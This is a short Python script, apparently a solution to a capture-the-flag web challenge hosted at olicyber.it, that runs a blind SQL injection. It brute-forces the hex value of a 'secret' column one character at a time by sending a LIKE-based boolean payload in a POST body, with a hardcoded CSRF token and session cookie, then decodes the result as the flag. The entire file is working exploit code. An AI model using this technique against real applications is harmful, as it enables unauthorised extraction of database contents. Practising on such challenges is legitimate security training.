import requests


dictionary = '0123456789abcdef'
result = ''

while True:
    for c in dictionary:
        question = f"1' and (select 1 from secret where HEX(asecret) LIKE '{result+c}%')='1"
        response = requests.post('http://web-17.challs.olicyber.it/api/blind', 
                                 headers={"X-CSRFToken":'IjM4YmQ3MWU5MWU0MzY5MTBiNTExOGYzZGFhYTk4M2Y3NWY4YTYxOTAi.Z-_zPw.AqlG5pvXGMwsbPp8xwRMJFCZ3pk'}, 
                                 json={'query': question}, 
                                 cookies={'session':'eyJjc3JmX3Rva2VuIjoiMzhiZDcxZTkxZTQzNjkxMGI1MTE4ZjNkYWFhOTgzZjc1ZjhhNjE5MCJ9.Z-_ujA.pARM2ZGszwn2T_ke_UAtPY5MGVo'}
                                )
        #print (response.status_code)
        #print(response.text)
        if response.status_code == 200:
            data = response.json()
            #print("Response JSON:", data)

            if data.get("result") == "Success":  
                result += c
                print(f"[+] Current result: {result}")
                break
    else:
        break

secret = bytes.fromhex(result).decode()
print(f"flag: {secret}")
